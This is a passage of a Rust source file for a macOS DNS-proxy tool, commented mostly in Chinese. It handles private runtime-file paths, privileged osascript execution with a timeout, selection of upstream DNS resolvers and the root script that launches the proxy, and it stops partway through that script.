use std::net::{IpAddr, SocketAddr};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

use mhost_core::OriginalDns;

// ---------------------------------------------------------------------------
// Runtime directory + signal/state file paths
// ---------------------------------------------------------------------------
//
// **fix (H1, issue #90)**: 把 DNS mode 的临时文件从 world-writable 的
// /tmp 迁移到用户私有目录 `~/Library/Application Support/mHost/.runtime/`，
// 并全部设 mode 0o600。/tmp 下的旧文件在 cleanup_stale_proxy 启动时一次
// 性清理（向后兼容老版本升级）。
//
// 这些路径之前是 `const &str`，改成 `fn` 因为：
//   1. runtime_dir 依赖环境（`dirs::data_dir()` 或 `$MHOST_RUNTIME_DIR`），
//      无法在 const 上下文计算。
//   2. 测试可设 `MHOST_RUNTIME_DIR=/tmp/mhost-test-xxx` 隔离，不用担心
//      污染用户的真实 runtime 目录。

/// mhost DNS mode runtime 目录路径。
///
/// 默认 `~/Library/Application Support/mHost/.runtime/` (macOS)。
/// 测试可通过 `MHOST_RUNTIME_DIR` 环境变量覆盖到 tempdir。
pub fn runtime_dir() -> PathBuf {
    if let Ok(p) = std::env::var("MHOST_RUNTIME_DIR") {
        return PathBuf::from(p);
    }
    let base = dirs::data_dir()
        .or_else(dirs::home_dir)
        .unwrap_or_else(|| PathBuf::from("/tmp"));
    base.join("mHost").join(".runtime")
}

/// 确保 runtime dir 存在，权限 0o700（owner only）。
pub fn ensure_runtime_dir() -> std::io::Result<PathBuf> {
    use std::os::unix::fs::PermissionsExt;
    let dir = runtime_dir();
    if !dir.exists() {
        std::fs::create_dir_all(&dir)?;
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(dir)
}

/// DNS proxy PID 文件路径。mode 0o600（root 创建）。
pub fn proxy_pid_file() -> PathBuf {
    runtime_dir().join("mhost-dns-proxy.pid")
}

/// 启用 DNS 模式前的原始 DNS（mhost 写入，proxy 读取用于退出恢复）。
/// mode 0o600（owner only）。
pub fn original_dns_file() -> PathBuf {
    runtime_dir().join("mhost-dns-original.txt")
}

/// Proxy 关闭信号文件：mhost 写入 "shutdown"，proxy 轮询检测后做清理退出。
/// mode 0o600（owner only）—— proxy 是 root 启动的，mhost 是用户态，但
/// 两者都用同一 uid 运行（mhost 通过 osascript 提权起 proxy）。如果
/// proxy 不是 root 启动，shutdown 写不进去是更安全的行为（外部攻击者
/// 即使有 /tmp 写权限也无法触发）。
pub fn shutdown_signal_file() -> PathBuf {
    runtime_dir().join("mhost-dns-shutdown.signal")
}

/// Proxy readiness 标记（fix issue #140）。
///
/// proxy 在 `UdpSocket::bind` 成功后立刻写该文件，osascript 脚本（`enable_dns_mode`）
/// 轮询此文件存在再切系统 DNS 到 127.0.0.1。比 `nc -z` 靠谱 —— proxy 只 bind UDP，
/// `nc -z` 默认 TCP 探测会一直超时；`nc -z -u` 对 connectionless UDP 语义不可靠。
/// proxy 退出路径会清理该文件（`restore_dns_and_exit`、错误路径）。
pub fn proxy_ready_file() -> PathBuf {
    runtime_dir().join("mhost-dns-proxy.ready")
}

/// Disable 路径的恢复标记：proxy 5s 内没退出 → 下次启动 mhost 会看到
/// 这个标记并强制走 `force_dns_restore_if_needed` 兜底（写 Empty 给活跃
/// 接口）。仅在确实出现 5s 超时时保留，正常路径会清理掉。
/// mode 0o600。
pub fn disable_recovery_marker_file() -> PathBuf {
    runtime_dir().join("mhost-dns-disable-recovery.marker")
}

/// 临时脚本名前缀（用于 osascript 提权）。
const TEMP_SCRIPT_PREFIX: &str = "mhost-dns-";

/// 等 proxy 退出的最大时长。
const PROXY_SHUTDOWN_TIMEOUT_SECS: u64 = 5;

/// 一次性的「老 /tmp 路径清理」：升级用户从老版本迁移过来时，
/// 旧路径下的文件不再被读写，会成为孤儿（其他用户可见，可能含 DNS 信息）。
/// 在 cleanup_stale_proxy 启动时删一下。
pub(crate) fn cleanup_legacy_tmp_files() {
    const LEGACY_PATHS: &[&str] = &[
        "/tmp/mhost-dns-proxy.pid",
        "/tmp/mhost-dns-original.txt",
        "/tmp/mhost-dns-shutdown.signal",
        "/tmp/mhost-dns-disable-recovery.marker",
    ];
    for path in LEGACY_PATHS {
        // 忽略错误（旧版本可能没创建过这些文件）
        let _ = std::fs::remove_file(path);
    }
}

/// 平台操作错误。
#[derive(Debug, thiserror::Error)]
pub enum PlatformError {
    #[error("failed to get system DNS: {0}")]
    GetDns(String),
    #[error("failed to set system DNS: {0}")]
    SetDns(String),
    #[error("failed to restore system DNS: {0}")]
    RestoreDns(String),
    #[error("failed to detect active network interface: {0}")]
    DetectInterface(String),
    #[error("invalid interface name: {0}")]
    InvalidInterfaceName(String),
    #[error("failed to write temp script: {0}")]
    TempScript(String),
    #[error("interface name is empty")]
    EmptyInterfaceName,
}

/// 接口名白名单：只允许字母、数字、空格、点、下划线、连字符、斜杠。
/// 这是 macOS 系统接口名常见字符集（如 "USB 10/100/1000 LAN"、"Wi-Fi"）。
/// 仍拒绝任何 shell 元字符（` ` $ \ & ; | < > ( ) { } [ ] ! ' " ` ? * ~ # % = : 等）。
fn is_valid_interface_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == ' ' || c == '.' || c == '_' || c == '-' || c == '/'
}

/// 验证接口名是否在白名单内。空字符串直接拒绝。
/// **fix（proxy self-cleanup）**：proxy 调 networksetup 时也要校验，
/// 所以改 pub 让 proxy 复用。
pub fn validate_interface_name(name: &str) -> Result<(), PlatformError> {
    if name.is_empty() {
        return Err(PlatformError::EmptyInterfaceName);
    }
    if !name.chars().all(is_valid_interface_char) {
        return Err(PlatformError::InvalidInterfaceName(format!(
            "name contains disallowed characters: {:?}",
            name
        )));
    }
    Ok(())
}

/// 生成下一个临时脚本的 PathBuf。文件名带递增后缀，避免 race。
fn next_temp_script_path() -> Result<PathBuf, PlatformError> {
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let n = COUNTER.fetch_add(1, Ordering::Relaxed);
    let name = format!("{}{}-{}.sh", TEMP_SCRIPT_PREFIX, std::process::id(), n);
    Ok(std::env::temp_dir().join(name))
}

/// 把 shell 脚本写到临时文件并设置 0o700，返回文件路径。
fn write_temp_script(content: &str) -> Result<PathBuf, PlatformError> {
    use std::os::unix::fs::OpenOptionsExt;
    let path = next_temp_script_path()?;
    let file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o700)
        .open(&path)
        .map_err(|e| PlatformError::TempScript(format!("create {:?}: {}", path, e)))?;
    use std::io::Write;
    let mut writer = std::io::BufWriter::new(file);
    writer
        .write_all(content.as_bytes())
        .map_err(|e| PlatformError::TempScript(format!("write {:?}: {}", path, e)))?;
    writer
        .flush()
        .map_err(|e| PlatformError::TempScript(format!("flush {:?}: {}", path, e)))?;
    Ok(path)
}

/// 使用 osascript 提权执行 shell 脚本。
///
/// **安全设计**：把脚本内容写到临时文件（0o700），osascript 只接收**文件路径**，
/// 路径通过 AppleScript 的 `quoted form of` 转义。任何 shell 元字符都进不到
/// 拼接的 AppleScript 字符串里。
fn run_with_privileges(script_body: &str) -> Result<std::process::Output, String> {
    let path = write_temp_script(script_body).map_err(|e| format!("temp script failed: {}", e))?;
    // 失败时清理临时文件
    let result = invoke_osascript(&path);
    let _ = std::fs::remove_file(&path);
    result
}

/// 调 osascript 让它以管理员权限执行临时脚本。脚本路径已写盘，
/// 字符串拼接只发生在 AppleScript 字面量内，并用 `quoted form of POSIX path of`
/// 走 AppleScript 自身的转义机制，不依赖手工 shell escape。
fn invoke_osascript(path: &std::path::Path) -> Result<std::process::Output, String> {
    let path_str = path.to_string_lossy();
    let apple_script = format!(
        "do shell script \"sh \" & quoted form of POSIX path of \"{}\" with administrator privileges",
        // 双重 escape 是因为我们要塞进 AppleScript 字符串字面量
        path_str.replace('\\', "\\\\").replace('"', "\\\"")
    );
    Command::new("osascript")
        .args(["-e", &apple_script])
        .output()
        .map_err(|e| format!("osascript failed: {}", e))
}

/// **fix (issue #142 follow-up)**：Result of an osascript invocation that
/// exposes the child PID so the caller can kill it on timeout — the
/// previous `Command::output()` wrapper hid the PID. macOS-only because
/// the osascript call site itself is macOS-only.
#[cfg(target_os = "macos")]
pub(crate) struct OsascriptRun {
    pub child: std::process::Child,
    pub pid: i32,
}

/// Spawn osascript and return the running `Child` so the caller can kill
/// it on timeout. Replaces the previous fire-and-forget `.output()` call.
///
/// Stdio pipes are set explicitly (`Stdio::piped()`) so the Rust side
/// owns valid pipes; without them `wait_with_output` would fail.
#[cfg(target_os = "macos")]
pub(crate) fn spawn_osascript(path: &std::path::Path) -> Result<OsascriptRun, String> {
    let path_str = path.to_string_lossy();
    let apple_script = format!(
        "do shell script \"sh \" & quoted form of POSIX path of \"{}\" with administrator privileges",
        path_str.replace('\\', "\\\\").replace('"', "\\\""),
    );
    let child = Command::new("osascript")
        .args(["-e", &apple_script])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| format!("osascript spawn failed: {}", e))?;
    let pid = child.id() as i32;
    Ok(OsascriptRun { child, pid })
}

/// Best-effort SIGKILL the osascript child. The goal is to unblock the
/// Rust-side wait so the UI can recover; the kill itself is fire-and-forget.
#[cfg(target_os = "macos")]
pub(crate) fn kill_osascript(pid: i32) {
    // SAFETY: `kill(2)` with a valid PID is safe; the PID comes from the
    // Child we just spawned and we hold the Child handle.
    unsafe {
        libc::kill(pid as libc::pid_t, libc::SIGKILL);
    }
}

/// Run osascript with a hard wall-clock timeout. On timeout, SIGKILL the
/// child and return `Err` so the caller surfaces a clear error to the UI.
///
/// Synchronous (not `tokio::time::timeout` + `spawn_blocking`) on purpose:
/// the v0.3.3 attempt used that pattern and was removed because dropping
/// the `JoinHandle` after timeout doesn't interrupt the blocking thread,
/// which leaks osascript and leaves `dns_enabled=false` in-memory while
/// the proxy is already running + system DNS is already flipped
/// (state desync). Here we hold the `Child` directly and SIGKILL on
/// expiry, so the child is reaped on every exit path.
#[cfg(target_os = "macos")]
pub(crate) fn run_with_privileges_timeout(
    script_body: &str,
    timeout: std::time::Duration,
) -> Result<std::process::Output, String> {
    let path = write_temp_script(script_body).map_err(|e| format!("temp script failed: {}", e))?;
    let mut run = match spawn_osascript(&path) {
        Ok(r) => r,
        Err(e) => {
            // spawn failed; safe to remove (osascript never started).
            let _ = std::fs::remove_file(&path);
            return Err(e);
        }
    };

    let start = std::time::Instant::now();
    // **Critical (issue found 2026-08-07)**: do NOT remove the temp script
    // file until AFTER osascript has exited. osascript spawns `sh <path>`
    // lazily from the AppleScript engine — if we delete the file before
    // that exec, sh gets ENOENT (exit 127) and osascript returns exit 256
    // with no error dialog visible to the user. This was the cause of
    // the "no prompt, no error, UI stuck" hang.
    let outcome: Result<std::process::Output, String> = loop {
        match run.child.try_wait() {
            Ok(Some(_status)) => {
                break run
                    .child
                    .wait_with_output()
                    .map_err(|e| format!("osascript wait_with_output failed: {}", e));
            }
            Ok(None) => {
                if start.elapsed() >= timeout {
                    kill_osascript(run.pid);
                    // Reap the zombie, don't block forever.
                    let _ = run.child.wait();
                    break Err(format!(
                        "osascript timed out after {:?} (killed pid={}); \
                         the TCC prompt may be stuck — try again or \
                         force-quit System Events",
                        timeout, run.pid
                    ));
                }
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
            Err(e) => break Err(format!("osascript try_wait failed: {}", e)),
        }
    };

    // SAFE TO REMOVE NOW: osascript has exited and won't exec sh again.
    let _ = std::fs::remove_file(&path);
    outcome
}

/// **fix（disabling-after-network-switch）**：capture the user's original DNS
/// configuration **type**, separating "user managed" from "DHCP/empty".
///
/// Rules:
/// 1. `networksetup -getdnsservers <port>`  returns non-empty
///    → `Manual(list)` — user explicitly configured DNS in System Settings.
/// 2. Tier 1 empty (DHCP-pushed but user hasn't confirmed in System Settings,
///    or true empty / air-gapped) → `DhcpEmpty`.
///
/// Tier 3 (the public `[8.8.8.8, 1.1.1.1]` resolver fallback) is **never**
/// returned here — it's not a "user state", it's a fallback for the resolver
/// upstream. See `get_upstream_resolvers` for that purpose.
pub fn capture_dns_state() -> Result<OriginalDns, PlatformError> {
    let port = get_active_network_interface()?;

    // Tier 1: 用户在 System Settings 里手动配的 DNS。
    if let Ok(servers) = networksetup_get_dns(&port) {
        if !servers.is_empty() {
            return Ok(OriginalDns::Manual(servers));
        }
    }

    // Tier 1 空：用户没手动配（系统用 DHCP 默认或真没 DNS）。
    // Tier 2 的具体 IP 值不写进 snapshot —— 不替用户决定配置。
    Ok(OriginalDns::DhcpEmpty)
}

/// 获取当前系统上游 DNS resolver 列表（Tlier 1 → Tier 2 → 公共 fallback）。
///
/// 用作 `DnsServer.upstream` 的初始值（以及 mid-session 刷新目标），
/// **不**用来决定 restore target（restore 用 `OriginalDns`，见
/// `OriginalDns::restore_argv`）。
///
/// Tier 3 兜底 `[8.8.8.8, 1.1.1.1]` 是上游 resolver 的最后一道防线，
/// 绝不是「用户原本的状态」——调用方 get_upstream_resolvers 的调用者应
/// 在返回为 Tier 3 时打 warning log。
///
/// 上游 DNS 的来源。`get_upstream_resolvers()` 返回此 enum 让上层能
/// 区分「用户配的 / DHCP 推的 / 公共 fallback」三种情况（例如打 warning）。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum UpstreamTier {
    /// Tier 1：`networksetup -getdnsservers` —— 用户在 System Settings
    /// 里手动配的 DNS。
    Networksetup,
    /// Tier 2：`ipconfig getoption <device> domain_name_server` ——
    /// DHCP 推的 DNS。
    Ipconfig,
    /// Tier 3：Tier 1 / Tier 2 都拿不到结果时的公共 fallback。
    Public,
}

/// **fix (issue #103)**：Tier 1 / Tier 2 拿到结果后会过滤掉本机 loopback /
/// unspecified 地址。DNS 模式启用后系统 DNS 被改成 `127.0.0.1`
///（见 `enable_dns_mode`），不剔除会导致 `run_upstream_refresh_loop`
/// 把 upstream hot-swap 成 `[127.0.0.1]`，DNS 服务器开始向自己递归
/// 转发，切换 WiFi 后也永远拿不到新网络的 DHCP DNS。
///
/// **fix issue #103 (debug follow-up)**：每个 tier 命中的瞬间都打
/// `tracing::debug!`，包括 Tier 1 / Tier 2 过滤前后的差异。配合
/// `RUST_LOG=mhost_dns=debug` 即可看到：
///   - networksetup / ipconfig 实际返回什么
///   - 哪些条目被 `is_local_resolver` 过滤掉
///   - 最终选中的 tier 是哪一个
///
/// 同时返回 `UpstreamTier`，调用方可以根据 source 区分「用户配置的
/// upstream」和「公共 DNS fallback」，避免对恰好等于 fallback 列表的
/// 合法配置（如用户在 System Settings 里手编 `[8.8.8.8, 1.1.1.1]`）
/// 误报"没拿到系统 DNS"。
pub fn get_upstream_resolvers() -> (Vec<String>, UpstreamTier) {
    let port = match get_active_network_interface() {
        Ok(p) => {
            tracing::debug!("get_upstream_resolvers: active interface port = {:?}", p);
            p
        }
        Err(e) => {
            tracing::debug!(
                "get_upstream_resolvers: get_active_network_interface failed ({}), falling back to Tier 3",
                e
            );
            return (tier3_fallback(), UpstreamTier::Public);
        }
    };

    let tier1 = networksetup_get_dns(&port).unwrap_or_default();
    if !tier1.is_empty() {
        tracing::debug!(
            "get_upstream_resolvers: Tier 1 (networksetup -getdnsservers {:?}) raw = {:?}",
            port,
            tier1
        );
    } else {
        tracing::debug!("get_upstream_resolvers: Tier 1 (networksetup) empty/failed");
    }

    let tier2 = get_active_network_device()
        .as_deref()
        .and_then(|dev| {
            tracing::debug!(
                "get_upstream_resolvers: Tier 2 querying ipconfig on device {:?}",
                dev
            );
            ipconfig_get_dns(dev).ok()
        })
        .unwrap_or_default();
    if !tier2.is_empty() {
        tracing::debug!("get_upstream_resolvers: Tier 2 (ipconfig) = {:?}", tier2);
    } else {
        tracing::debug!("get_upstream_resolvers: Tier 2 (ipconfig) empty/failed");
    }

    let (result, source) = select_upstream(tier1, tier2);
    tracing::debug!(
        "get_upstream_resolvers: selected tier={:?} result={:?}",
        source,
        result
    );
    (result, source)
}

/// 给定 Tier 1 / Tier 2 原始结果，挑出该用的 upstream 并报告来源。
///
/// 规则：
/// 1. Tier 1 过滤 loopback 后非空 → 用 Tier 1（用户意图优先）
/// 2. Tier 2 过滤 loopback 后非空 → 用 Tier 2（DHCP-pushed）
/// 3. 两者都空 → Tier 3 公共 fallback
///
/// **fix (issue #103)**：loopback 过滤对 Tier 1 / Tier 2 都应用（不仅
/// Tier 1），保证不会因为 `ipconfig getoption` 偶尔返回 `127.0.0.1`
/// 而把 self-loop 写回 upstream。
///
/// 这个函数是纯函数，方便单测；`get_upstream_resolvers()` 只是
/// shell 调用 + 调它的薄壳。
pub fn select_upstream(tier1: Vec<String>, tier2: Vec<String>) -> (Vec<String>, UpstreamTier) {
    let tier1_filtered: Vec<String> = tier1
        .into_iter()
        .filter(|s| !is_local_resolver(s))
        .collect();
    if !tier1_filtered.is_empty() {
        return (tier1_filtered, UpstreamTier::Networksetup);
    }
    let tier2_filtered: Vec<String> = tier2
        .into_iter()
        .filter(|s| !is_local_resolver(s))
        .collect();
    if !tier2_filtered.is_empty() {
        return (tier2_filtered, UpstreamTier::Ipconfig);
    }
    (tier3_fallback(), UpstreamTier::Public)
}

/// **fix (issue #103)**：判断一个 resolver 字符串是否是「指向本机」的
/// 地址（即不应该被当成 upstream）。覆盖：
///
/// - IPv4 loopback（`127.0.0.0/8`，不仅是 `127.0.0.1`）
/// - IPv6 loopback（`::1`）
/// - IPv4 / IPv6 unspecified（`0.0.0.0` / `::`）
///
/// 同时容忍 `host:port` 和 `[host]:port`（v6 bracketed）形式；如果
/// 解析不出来（畸形字符串），按「非本地」处理，保留给上层常规校验
/// 兜底（参见 `proxy.rs::validate_dns_entries`）。
fn is_local_resolver(server: &str) -> bool {
    let host = server
        .parse::<SocketAddr>()
        .map(|sa| sa.ip())
        .or_else(|_| server.parse::<IpAddr>());
    matches!(host, Ok(ip) if ip.is_loopback() || ip.is_unspecified())
}

/// Tier 3 fallback list. Public so tests can compare against it.
pub fn tier3_fallback() -> Vec<String> {
    vec!["8.8.8.8".to_string(), "1.1.1.1".to_string()]
}

/// `networksetup -getdnsservers <port>` —— 用户在 System Settings 里
/// 手动配的 DNS。返回空 vec 表示「没手动配」（常见于纯 DHCP 场景）。
fn networksetup_get_dns(port: &str) -> Result<Vec<String>, PlatformError> {
    let output = Command::new("networksetup")
        .args(["-getdnsservers", port])
        .output()
        .map_err(|e| PlatformError::GetDns(format!("networksetup command failed: {}", e)))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::GetDns(format!(
            "networksetup failed: {}",
            stderr
        )));
    }
    let raw = parse_dns_servers(&String::from_utf8_lossy(&output.stdout))?;
    // **fix (issue #152, root cause 2)**: `127.0.0.1` / `::1` are
    // mHost's own proxy address injected by `enable_dns_mode`. If they
    // are read back via `capture_dns_state` (e.g., enable → partial-fail
    // disable → re-enable before marker recovery), they get persisted
    // to `mhost-dns-original.txt` and `manifest.original_dns` as the
    // "user's original DNS", which silently corrupts future restores.
    //
    // `is_local_resolver` is already used by `get_upstream_resolvers`
    // (issue #103 fix) for the same reason. Reuse here.
    let filtered: Vec<String> = raw.into_iter().filter(|s| !is_local_resolver(s)).collect();
    Ok(filtered)
}

/// `ipconfig getoption <device> domain_name_server` —— DHCP 推的 DNS。
/// 每行一个 IP（legacy 版本可能空格分隔），由 `parse_dns_servers` 统一解析。
fn ipconfig_get_dns(device: &str) -> Result<Vec<String>, PlatformError> {
    let output = Command::new("ipconfig")
        .args(["getoption", device, "domain_name_server"])
        .output()
        .map_err(|e| PlatformError::GetDns(format!("ipconfig failed: {}", e)))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::GetDns(format!(
            "ipconfig failed: {}",
            stderr
        )));
    }
    parse_dns_servers(&String::from_utf8_lossy(&output.stdout))
}

/// 默认路由对应的 BSD 设备名（如 `en0`），供 ipconfig 使用。
/// 失败返回 None（get_system_dns 走 Tier 3 兜底）。
fn get_active_network_device() -> Option<String> {
    let output = Command::new("route")
        .args(["-n", "get", "default"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    parse_route_interface(&stdout)
}

/// 在 macOS 上启用 DNS 模式：
///   1. mhost 把 original DNS 写到 `$RUNTIME_DIR/mhost-dns-original.txt`
///      （用户态写自己私有目录，不需要 root）
///   2. mhost 创建 `$RUNTIME_DIR/mhost-dns-shutdown.signal`，content="running"，
///      mode=0o600（owner only；proxy 是同 uid 提权启动，能写）
///   3. osascript 提权跑脚本：起 proxy + 改系统 DNS = 127.0.0.1
///
/// **fix（proxy self-cleanup）**：把 original DNS 和 signal file 提前
/// 写到 runtime dir（不需要 root），让 proxy 在退出时能自己读 original +
/// 检测 signal 文件，**不需要再走 osascript 弹 sudo 框**。
///
/// **fix（H1, issue #90）**：从 /tmp 迁移到 ~/Library/Application Support/mHost/.runtime/，
/// mode 从 0o666 改 0o600。/tmp 旧路径在 cleanup_stale_proxy 启动时清理。
pub fn enable_dns_mode(dns_port: u16, original: &OriginalDns) -> Result<(), PlatformError> {
    tracing::info!("enable_dns_mode: entered (dns_port={})", dns_port);
    let interface = get_active_network_interface()?;
    tracing::info!(
        "enable_dns_mode: get_active_network_interface returned: {}",
        interface
    );
    validate_interface_name(&interface)?;

    // 0. 确保 runtime dir 存在（mode 0o700）
    ensure_runtime_dir()
        .map_err(|e| PlatformError::SetDns(format!("create runtime dir: {}", e)))?;

    // 1. 写 original DNS 文件（用户态，不需要 root）
    //    proxy 启动时读这个文件，退出时按它恢复系统 DNS
    //
    // 关键：仅当用户**手动配过** DNS（Manual）才写文件。
    // DhcpEmpty 不写 → proxy 启动时 read_original_dns_from_file 返回空 →
    // restore 走 Empty 分支（不会泄漏 DHCP 推的 IP）。
    let original_path = original_dns_file();
    if let OriginalDns::Manual(servers) = original {
        let original_content = servers.join("\n");
        write_atomic_0600(&original_path, original_content.as_bytes())
            .map_err(|e| PlatformError::SetDns(format!("write original dns file: {}", e)))?;
    } else {
        // DhcpEmpty: 确保没有残留的旧文件（从前一次 Manual enable 留下来）。
        let _ = std::fs::remove_file(&original_path);
    }

    // 2. 写 signal 文件（0o600 owner-only；proxy 是同 uid 提权启动，能写）
    write_signal_file(&shutdown_signal_file(), "running")
        .map_err(|e| PlatformError::SetDns(format!("write shutdown signal file: {}", e)))?;

    // 3. 构建 dns-proxy 二进制路径（与 mhost 同目录）
    let proxy_path = std::env::current_exe()
        .ok()
        .and_then(|p| {
            p.parent()
                .map(|dir| dir.join("mhost-dns-proxy").to_string_lossy().to_string())
        })
        .unwrap_or_else(|| "mhost-dns-proxy".to_string());

    // 3.1 前置检查（fix issue #140）：proxy 二进制必须存在且可执行。
    // 如果 release 没把 mhost-dns-proxy 一起打包（peer 调查发现的历史 bug），
    // 立即报错而不是让脚本 background 失败 + 切 DNS，留下"系统 DNS 指向
    // 127.0.0.1 但没人在 listen"的烂摊子。
    let proxy_path_buf = PathBuf::from(&proxy_path);
    if !proxy_path_buf.is_file() {
        return Err(PlatformError::SetDns(format!(
            "dns proxy binary not found at {}; reinstall mHost",
            proxy_path
        )));
    }

    // 3.2 清掉上一轮残留的 ready 文件（如果 proxy 之前异常退出没清理）。
    let _ = std::fs::remove_file(proxy_ready_file());

    // 3.3 **fix (issue #148)**：orphan-cleanup 由 `build_enable_script_body`
    // 顶部的 inline pgrep 循环负责(脚本本身 root,TERM/KILL 一定能送达)。
    //
    // 旧实现 `kill_orphan_dns_proxies()` + `sleep(200ms)` 是 user-mode
    // `libc::kill(SIGTERM)`,对 root-owned proxy 会被 macOS EACCES 静默丢弃
    // —— pgrep 找得到但 kill 杀不掉,等于 silent no-op 还给读者制造「双重
    // 保护」的错觉。**已删除**(fix issue #148 review):enable 路径唯一真
    // 兜底是 inline 脚本里的 pgrep 循环,disable 路径在 `cleanup_dns_on_exit`
    // 入口用 `is_expected_proxy_alive()` 区分后调 `sudo_kill_orphan_dns_proxies`。

    // 4. osascript 提权跑脚本
    // PID 文件内容: "{pid} {binary_path}\n" 供 cleanup_stale_proxy 校验 cmdline
    //
    // **fix (issue #140：DNS mode 启用后所有查询失败)**：必须等 proxy
    // bind UDP 53 端口后再切系统 DNS。之前的 `&` + `disown` + `networksetup`
    // 三步紧挨着执行，proxy 进程还在启动过程中 macOS 已经把系统 DNS
    // 改成 127.0.0.1 → 任何域名查询落到还没 bind 的端口 → connection-refused
    // → 表现为"profile 规则和公开域名都 ping 不通，只有 /etc/hosts 能通"。
    //
    // proxy 只 bind UDP（见 proxy.rs::run），不能用 `nc -z`（默认 TCP）探测。
    // 用 ready 文件做 readiness 信号：proxy 启动后 `UdpSocket::bind` 成功
    // 立刻写 `mhost-dns-proxy.ready`；脚本轮询该文件存在再切系统 DNS。
    // 5s 内未 ready → 杀 proxy + 非零退出（让 mhost 端能感知、回滚）。
    //
    // **fix (issue #148：orphan proxy)**：trap + cleanup() 在脚本任何退出路径
    // (exit 1 / Cancel / networksetup reject / ready 失败)kill proxy。
    // `proxy_should_keep_running=1` 标志在 networksetup 成功之后才置位,
    // 此后 trap 触发不再 kill —— 这是正常成功路径下让 proxy 留活的关键。
    let pid_file = proxy_pid_file();
    let ready_file = proxy_ready_file();
    let script_body =
        build_enable_script_body(&proxy_path, dns_port, &pid_file, &ready_file, &interface);
    tracing::info!(
        "enable_dns_mode: invoking osascript (timeout=60s) for interface={}, dns_port={}",
        interface,
        dns_port
    );
    let output = run_with_privileges_timeout(&script_body, std::time::Duration::from_secs(60))
        .map_err(|e| PlatformError::SetDns(format!("enable dns mode failed: {}", e)))?;
    tracing::info!(
        "enable_dns_mode: osascript returned: status={:?}, stdout_len={}, stderr_len={}",
        output.status,
        output.stdout.len(),
        output.stderr.len()
    );
    if !output.status.success() {
        // 回滚：清理刚才写的文件
        let _ = std::fs::remove_file(&original_path);
        let _ = std::fs::remove_file(shutdown_signal_file());
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::SetDns(format!("command failed: {}", stderr)));
    }
    Ok(())
}

/// **fix (issue #148)**：构造 enable DNS mode 的 elevated sh 脚本。
///
/// 单独提出来是为了让 `platform.rs::tests` 能在不需要 sudo 的前提下断言
/// 脚本结构(trap / cleanup / handoff flag / inline orphan-kill)。
///
/// 返回的脚本里：
/// 1. inline sudo-level orphan-kill（脚本本身 root，TERM/KILL 都能送达）
/// 2. `trap cleanup EXIT INT TERM` + `cleanup()` 函数：脚本任何失败路径
///    (ready 超时、networksetup 拒绝、用户 osascript Cancel)kill proxy
/// 3. ready-file polling → networksetup 切系统 DNS
/// 4. `proxy_should_keep_running=1` handoff flag:成功路径下 trap 不 kill proxy
///
/// 注：`{proxy}` `{pid_file}` `{ready_file}` `{interface}` 都来自调用方已校验
/// 的输入；`proxy_path` 已经在 caller 端 `is_file()` 校验过；
/// `validate_interface_name` 在 `enable_dns_mode` 入口处跑过；`pid_file` /
/// `ready_file` 是固定 runtime_dir 下的派生路径，不是用户输入。
#[cfg(target_os = "macos")]
pub(crate) fn build_enable_script_body(
    proxy: &str,
    dns_port: u16,
    pid_file: &std::path::Path,
    ready_file: &std::path::Path,
    interface: &str,
) -> String {
    format!(
        r#"#!/bin/sh
set -e

# ---- issue #148: trap-based lifecycle for the elevated proxy ----
# proxy 是这个 osascript-elevated sh 的 root 后台子进程。任何失败路径
# (bind fail / networksetup reject / osascript Cancel)都必须 kill proxy,
# 否则它就以 root 身份孤儿着占着 UDP 53,下一次 enable 撞
# `Address already in use`。
#
# 成功路径:networksetup 切完 DNS 后,设 `proxy_should_keep_running=1` 然后
# exit 0 → trap 触发但不 kill(proxy 还在跑)。
proxy_pid=""
proxy_should_keep_running=0

cleanup() {{
    if [ "$proxy_should_keep_running" != "1" ]; then
        if [ -n "$proxy_pid" ]; then
            kill -TERM "$proxy_pid" 2>/dev/null || true
            sleep 1
            kill -KILL "$proxy_pid" 2>/dev/null || true
        fi
        # 兜底:扫一遍同名孤儿(root signal 一定能送达)
        for pid in $(pgrep -x mhost-dns-proxy); do
            kill -TERM "$pid" 2>/dev/null || true
        done
        sleep 1
        for pid in $(pgrep -x mhost-dns-proxy); do
            kill -KILL "$pid" 2>/dev/null || true
        done
        # 失败路径:pid_file 也清掉,disable 协议里 read_proxy_pid() 会读到 None
        # → 走「proxy 不在」分支 + osascript sudo 兜底,符合预期。
        rm -f "{pid_file}" "{ready_file}"
    else
        # 成功路径:proxy 还在跑,pid_file 必须保留给 disable 协议用
        # (read_proxy_pid() → signal-file 协议 → 自我恢复 DNS)。
        # 只清 ready_file(proxy 退出时本来也会清)。
        rm -f "{ready_file}"
    fi
}}
trap cleanup EXIT INT TERM

# ---- fix A: inline sudo-level orphan cleanup (already-elevated shell) ----
# 在起新 proxy 之前先把上一轮残留的同名孤儿杀掉 —— 既然脚本已经 root,
# TERM/KILL 一定能送达,不需要再来一次 sudo 弹窗。
for pid in $(pgrep -x mhost-dns-proxy); do
    kill -TERM "$pid" 2>/dev/null || true
done
sleep 1
for pid in $(pgrep -x mhost-dns-proxy); do
    kill -KILL "$pid" 2>/dev/null || true
done

# ---- enable: launch proxy, wait for ready, hand off to system ----
# Critical: redirect all three FDs to /dev/null BEFORE backgrounding.
# `disown` removes the job from the shell's job table but does NOT close
# inherited FDs. Without this redirect, mhost-dns-proxy inherits
# osascript's captured stdout/stderr pipes (invoke_osascript uses
# Command::output()). The proxy stays alive and keeps those pipes open,
# so Command::output() never observes EOF and the enable-dns IPC hangs
# forever with no error. Order matters: `&` MUST come last.
"{proxy}" --listen 53 --target {dns_port} </dev/null >/dev/null 2>&1 &
proxy_pid=$!
echo "$proxy_pid {proxy}" > {pid_file}
disown

